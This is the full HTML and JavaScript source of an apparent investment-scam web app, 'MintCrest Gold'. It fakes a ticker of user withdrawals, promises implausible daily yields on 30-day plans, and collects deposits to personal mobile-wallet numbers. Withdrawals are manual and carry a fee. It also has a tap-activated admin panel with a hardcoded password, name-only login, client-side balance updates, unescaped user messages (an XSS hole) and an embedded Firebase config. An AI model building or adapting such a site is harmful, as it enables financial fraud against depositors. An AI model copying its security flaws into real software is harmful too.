<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Gold | Official Asset Portal</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        :root { --bg: #ffffff; --card: #f8fafc; --text: #0f172a; --accent: #2563eb; --border: #e2e8f0; }
        .dark { --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --accent: #3b82f6; --border: #334155; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); transition: 0.3s; overflow-x: hidden; }
        .glass { background: var(--card); border: 1px solid var(--border); box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.02); }
        .page { display: none; animation: fadeIn 0.4s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        .nav-btn { opacity: 0.4; transition: 0.3s; }
        .active-tab { opacity: 1; color: var(--accent); font-weight: 800; }
        
        /* Floating Support Icon */
        #support-trigger { position: fixed; bottom: 100px; right: 20px; z-index: 5000; transition: 0.3s; }
        #support-trigger:active { scale: 0.9; }
        
        /* Live Ticker */
        .ticker-wrap { position: fixed; bottom: 85px; width: 100%; background: #0f172a; color: white; padding: 6px 0; font-size: 8px; font-weight: 800; overflow: hidden; z-index: 3000; }
        .ticker { display: inline-block; white-space: nowrap; animation: ticker 20s linear infinite; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        ::-webkit-scrollbar { display: none; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div class="ticker-wrap">
        <div class="ticker uppercase italic">
            • User @Zain_Pro just withdrew ₨ 4,500 via EasyPaisa • User @Sarah_VIP activated Diamond Tier • User @Hamza786 received ₨ 200 Bonus • MintCrest Gold: Secure & Trusted Assets •
        </div>
    </div>

    <button id="support-trigger" onclick="changePage('support')" class="w-14 h-14 bg-blue-600 rounded-full shadow-2xl flex items-center justify-center text-2xl text-white">
        🎧
    </button>

    <section id="auth-ui" class="fixed inset-0 z-[10000] bg-white flex flex-col items-center justify-center p-8 text-center">
        <div class="w-20 h-20 bg-blue-600 rounded-[2rem] flex items-center justify-center text-white text-4xl font-black mb-6 shadow-2xl shadow-blue-100">M</div>
        <h1 onclick="adminTap()" class="text-3xl font-black tracking-tighter mb-1">MINTCREST GOLD</h1>
        <p class="text-slate-400 text-[9px] uppercase tracking-[0.3em] mb-12 font-bold italic">Authorized Asset Management</p>
        <div class="w-full max-w-xs">
            <input type="text" id="user-name" placeholder="Enter Full Name" class="w-full p-4 rounded-xl bg-slate-50 border border-slate-200 text-center font-bold mb-4 focus:ring-2 ring-blue-500 outline-none">
            <button onclick="login()" class="w-full bg-blue-600 py-4 rounded-xl font-black text-[10px] uppercase text-white shadow-lg active:scale-95 transition-all">Connect to Node</button>
        </div>
    </section>

    <header class="p-5 flex justify-between items-center fixed top-0 w-full z-50 bg-white/80 backdrop-blur-md border-b border-slate-100">
        <div class="flex items-center gap-2">
            <div class="w-7 h-7 bg-blue-600 rounded-lg flex items-center justify-center text-white font-black text-[10px]">M</div>
            <span class="font-bold text-xs uppercase tracking-tighter">MintCrest</span>
        </div>
        <div class="flex gap-4">
            <button onclick="logout()" class="text-[9px] font-black uppercase text-red-500">Exit</button>
        </div>
    </header>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pt-20 pb-32 px-5">
        
        <div id="p-home" class="page active-page">
            <div class="bg-blue-600 p-8 rounded-[2.5rem] mb-6 shadow-xl shadow-blue-100 text-white relative overflow-hidden">
                <p class="text-[9px] opacity-70 font-bold uppercase mb-1">Available Liquidity</p>
                <h2 class="text-4xl font-black tracking-tight" id="v-bal">₨ 0</h2>
                
                <div class="mt-6 bg-black/10 p-4 rounded-2xl flex justify-between items-center">
                    <div>
                        <p class="text-[7px] uppercase font-bold opacity-60">Next Cycle In:</p>
                        <p id="profit-timer" class="text-xs font-black tracking-widest">00:00:00</p>
                    </div>
                    <button onclick="requestBonus()" class="bg-white text-blue-600 px-4 py-2 rounded-xl text-[8px] font-black uppercase shadow-sm">Claim Bonus 🎁</button>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-3 mb-6">
                <button onclick="changePage('wallet')" class="glass p-6 rounded-3xl text-center shadow-sm">
                    <div class="text-xl mb-1">📥</div>
                    <span class="text-[9px] font-black uppercase tracking-widest">Deposit</span>
                </button>
                <button onclick="changePage('withdraw')" class="glass p-6 rounded-3xl text-center shadow-sm">
                    <div class="text-xl mb-1">📤</div>
                    <span class="text-[9px] font-black uppercase tracking-widest">Withdraw</span>
                </button>
            </div>

            <div class="glass p-4 rounded-2xl mb-6 flex gap-2">
                <input type="text" id="promo-input" placeholder="Enter Gift Code" class="flex-1 bg-transparent text-[10px] font-bold px-2 uppercase border-none outline-none">
                <button onclick="submitPromoRequest()" class="bg-slate-900 text-white px-5 py-2 rounded-xl text-[8px] font-black uppercase">Redeem</button>
            </div>

            <div class="grid grid-cols-2 gap-3">
                <a href="https://wa.me/yourlink" class="glass p-4 rounded-2xl flex items-center justify-center gap-2 border-green-50">
                    <span class="text-green-600 text-[9px] font-black uppercase italic">Official WhatsApp</span>
                </a>
                <button onclick="changePage('info')" class="glass p-4 rounded-2xl flex items-center justify-center gap-2">
                    <span class="text-blue-600 text-[9px] font-black uppercase italic">Company Profile</span>
                </button>
            </div>
        </div>

        <div id="p-invest" class="page">
            <h3 class="font-black text-center text-[10px] mb-6 uppercase tracking-[0.3em] opacity-40">30-Day Managed Portfolios</h3>
            <div id="plans-list" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-support" class="page">
            <div class="glass p-7 rounded-[2rem] shadow-sm">
                <h3 class="font-black text-center mb-1 uppercase text-blue-600 text-sm">Customer Service</h3>
                <p class="text-[8px] text-center opacity-40 mb-8 uppercase font-bold italic">Direct response from administration</p>
                <textarea id="sup-msg" placeholder="Write your message or issue here..." class="w-full h-32 p-4 rounded-xl mb-4 text-xs font-bold bg-white border border-slate-100 outline-none"></textarea>
                <button onclick="sendSup()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-black text-[9px] uppercase shadow-lg shadow-blue-100">Send to Admin</button>
                <div id="sup-replies" class="mt-8 space-y-3"></div>
            </div>
        </div>

        <div id="p-wallet" class="page">
            <div class="glass p-7 rounded-[2rem]">
                <h3 class="font-black text-center mb-6 uppercase text-blue-600 text-sm">Funding Center</h3>
                <div class="space-y-2 mb-8 text-[9px] font-bold">
                    <div class="flex justify-between p-4 bg-slate-50 rounded-xl"><span>JazzCash / SadaPay</span><span class="text-blue-600">03705519562</span></div>
                    <div class="flex justify-between p-4 bg-slate-50 rounded-xl"><span>EasyPaisa</span><span class="text-green-600">03379827882</span></div>
                </div>
                <input type="number" id="d-amt" placeholder="Enter Amount" class="w-full p-4 rounded-xl mb-3 text-center font-bold text-xs bg-white border border-slate-100 outline-none">
                <input type="text" id="d-tid" placeholder="Transaction ID (TID)" class="w-full p-4 rounded-xl mb-4 text-center font-bold uppercase text-xs bg-white border border-slate-100 outline-none">
                <input type="file" id="d-file" accept="image/*" class="w-full mb-6 text-[9px]">
                <button onclick="subDep()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-black text-[9px] uppercase">Submit Capital</button>
            </div>
        </div>

        <div id="p-withdraw" class="page">
            <div class="glass p-7 rounded-[2rem] border-t-4 border-slate-900 shadow-sm">
                <h3 class="font-black text-center mb-1 uppercase text-sm">Liquidation Request</h3>
                <p class="text-[7px] text-center opacity-40 mb-8 uppercase font-bold">Processed within 24 Hours</p>
                <input type="number" id="w-amt" placeholder="Amount (PKR)" class="w-full p-4 rounded-xl mb-3 text-center font-bold text-xs bg-white border border-slate-100">
                <input type="text" id="w-acc" placeholder="Account Title & Number" class="w-full p-4 rounded-xl mb-8 text-center font-bold text-xs bg-white border border-slate-100">
                <button onclick="subWd()" class="w-full bg-slate-900 text-white py-4 rounded-xl font-black text-[9px] uppercase">Authorize Withdraw</button>
            </div>
        </div>

        <div id="p-info" class="page">
            <div class="glass p-7 rounded-[3rem] space-y-8 text-[9px] leading-relaxed">
                <div>
                    <h4 class="font-black text-blue-600 uppercase mb-2 tracking-widest underline decoration-2">Corporate Profile</h4>
                    <p class="opacity-70 font-bold">MintCrest Gold is a premier digital asset management firm. We specialize in node-based liquidity pools that provide sustainable 30-day yields for global investors. Our system is fully encrypted and manually audited.</p>
                </div>
                <div>
                    <h4 class="font-black text-blue-600 uppercase mb-2 tracking-widest underline decoration-2">Privacy & Security</h4>
                    <p class="opacity-70 font-bold">User confidentiality is our priority. We utilize 256-bit SSL encryption. No personal or financial data is shared with third-party networks. Every transaction is manually verified by our audit team.</p>
                </div>
                <div>
                    <h4 class="font-black text-blue-600 uppercase mb-2 tracking-widest underline decoration-2">Terms of Liquidation</h4>
                    <p class="opacity-70 font-bold">Withdrawals are processed manually to ensure security. A standard 10% maintenance fee is applied to each payout to ensure the longevity of the asset pool.</p>
                </div>
            </div>
        </div>

    </main>

    <div id="admin-panel" class="fixed inset-0 bg-white z-[50000] hidden overflow-y-auto px-6 pt-10">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-xl font-black text-blue-600 uppercase">Command Hub</h2>
            <button onclick="closeAdmin()" class="bg-red-500 text-white px-5 py-2 rounded-lg text-[9px] font-black uppercase">Lock Node</button>
        </div>
        <div id="adm-req-list" class="space-y-4 pb-20"></div>
    </div>

    <nav id="bottom-nav" class="hidden bg-white/95 backdrop-blur-md border-t p-5 flex justify-around items-center fixed bottom-0 w-full z-[4000]">
        <button onclick="changePage('home')" id="n-home" class="nav-btn active-tab flex flex-col items-center">
            <span class="text-xl">🏠</span>
            <span class="text-[7px] uppercase mt-1 font-black">Dashboard</span>
        </button>
        <button onclick="changePage('invest')" id="n-invest" class="nav-btn flex flex-col items-center">
            <span class="text-xl">📊</span>
            <span class="text-[7px] uppercase mt-1 font-black">Portfolios</span>
        </button>
        <button onclick="changePage('wallet')" id="n-wallet" class="nav-btn flex flex-col items-center">
            <span class="text-xl">🏦</span>
            <span class="text-[7px] uppercase mt-1 font-black">Capital</span>
        </button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let tapCount = 0;

        const plans = [];
        for(let i=1; i<=25; i++) { plans.push({ name: `Asset Tier ${i}`, price: 200 * i, daily: (15 * i), val: 30 }); }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                list.innerHTML += `<div onclick="buyPlan(${p.price}, '${p.name}', ${p.daily})" class="glass p-5 rounded-3xl flex justify-between items-center active:scale-95 transition-all shadow-sm">
                    <div><h4 class="font-black text-[9px] uppercase tracking-tighter">${p.name}</h4><p class="text-[8px] text-blue-600 font-bold uppercase italic">₨ ${p.daily} Daily Yield</p></div>
                    <div class="text-xs font-black italic">₨ ${p.price.toLocaleString()}</div>
                </div>`;
            });
        }

        async function login() {
            const n = document.getElementById('user-name').value.trim().toLowerCase(); if(!n) return;
            localStorage.setItem('mc_user', n);
            const ref = db.collection("users").doc(n); const d = await ref.get();
            if(!d.exists) await ref.set({ name: n, balance: 0, profit: 0, lastBonus: 0, time: Date.now() });
            document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            sync(n); renderPlans(); startTimer();
        }

        function sync(n) {
            db.collection("users").doc(n).onSnapshot(d => { 
                user = d.data(); 
                document.getElementById('v-bal').innerText = "₨ "+user.balance.toLocaleString(); 
            });
            db.collection("support").where("user", "==", n).orderBy("time", "desc").onSnapshot(s => {
                const list = document.getElementById('sup-replies'); list.innerHTML = '';
                s.forEach(doc => { const m = doc.data(); list.innerHTML += `<div class="p-4 rounded-2xl bg-slate-50 text-[8px] font-bold border border-slate-100"><p class="text-blue-600 uppercase mb-1">${m.from==='admin'?'Official Support':'You'}</p><p>${m.message}</p></div>`; });
            });
        }

        async function submitPromoRequest() {
            const code = document.getElementById('promo-input').value.trim().toUpperCase(); if(!code) return alert("Enter Code! 😘");
            await db.collection("requests").add({ user: user.name, type: "Promo Code Request", codeUsed: code, status: "pending", time: Date.now() });
            document.getElementById('promo-input').value = ''; alert("Request Sent! Admin will verify. 😘");
        }

        async function requestBonus() {
            const now = Date.now(); if(now - (user.lastBonus || 0) < 86400000) return alert("Wait 24h! 😘");
            await db.collection("requests").add({ user: user.name, type: "Daily Bonus Request", status: "pending", time: now });
            await db.collection("users").doc(user.name).update({ lastBonus: now });
            alert("Bonus Request Logged! 😘");
        }

        async function subDep() {
            const a = document.getElementById('d-amt').value; const t = document.getElementById('d-tid').value; const f = document.getElementById('d-file').files[0];
            if(!a || !t || !f) return alert("All fields required! 😘");
            const sRef = storage.ref(`receipts/${Date.now()}`);
            await sRef.put(f); const url = await sRef.getDownloadURL();
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: url, type: "deposit", status: "pending", time: Date.now() });
            alert("Capital Submitted! 😘");
        }

        async function subWd() {
            const a = parseInt(document.getElementById('w-amt').value); const acc = document.getElementById('w-acc').value;
            if(!a || a > user.balance || !acc) return alert("Check balance! 😘");
            await db.collection("users").doc(user.name).update({ balance: user.balance - a });
            await db.collection("requests").add({ user: user.name, amount: a, acc: acc, type: "withdrawal", status: "pending", time: Date.now() });
            alert("Withdraw Authorized! 😘");
        }

        async function sendSup() {
            const m = document.getElementById('sup-msg').value; if(!m) return;
            await db.collection("support").add({ user: user.name, from: "user", message: m, time: Date.now() });
            document.getElementById('sup-msg').value = ''; alert("Message Sent to Admin! 😘");
        }

        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("Pass:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }

        async function syncAdm() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(s => {
                const rl = document.getElementById('adm-req-list'); rl.innerHTML = '';
                s.forEach(doc => {
                    const x = doc.data(); rl.innerHTML += `<div class="glass p-5 rounded-3xl mb-4 border-l-4 border-blue-600 shadow-sm">
                        <p class="text-[10px] font-black uppercase mb-1">${x.user} | ${x.type}</p>
                        <p class="text-[7px] opacity-40 mb-3">${x.tid||x.acc||x.codeUsed||''}</p>
                        <div class="flex gap-2">
                            <button onclick="hndReq('${doc.id}','${x.user}',${x.amount},'approved','${x.type}')" class="flex-1 bg-blue-600 text-white py-3 rounded-xl text-[8px] font-black uppercase">Approve</button>
                            <button onclick="hndReq('${doc.id}','${x.user}',${x.amount},'rejected','${x.type}')" class="flex-1 bg-red-600 text-white py-3 rounded-xl text-[8px] font-black uppercase">Reject</button>
                        </div>
                    </div>`;
                });
            });
        }

        async function hndReq(id, u, amt, act, type) {
            if(act==='approved') {
                if(type.includes("Request")) { const b = parseInt(prompt(`Enter Bonus for ${u}:`)); await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(b) }); }
                else if(type==='deposit') await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(amt) });
            }
            await db.collection("requests").doc(id).update({ status: act });
        }

        function startTimer() { setInterval(() => { const now = new Date(); const night = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1, 0, 0, 0); const diff = night - now; const h = Math.floor((diff / (1000 * 60 * 60)) % 24); const m = Math.floor((diff / (1000 * 60)) % 60); const s = Math.floor((diff / 1000) % 60); document.getElementById('profit-timer').innerText = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`; }, 1000); }
        async function buyPlan(p, n, d) { if(user.balance < p) return alert("Capital Low! 😘"); if(confirm(`Activate ${n}?`)) { await db.collection("users").doc(user.name).update({ balance: firebase.firestore.FieldValue.increment(-p) }); await db.collection("requests").add({ user: user.name, type: "Plan: "+n, amount: p, status: "approved", time: Date.now() }); alert("Activated! 😘"); } }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active-tab')); if(document.getElementById('n-'+p)) document.getElementById('n-'+p).classList.add('active-tab'); window.scrollTo(0,0); }
    </script>
</body>
</html>
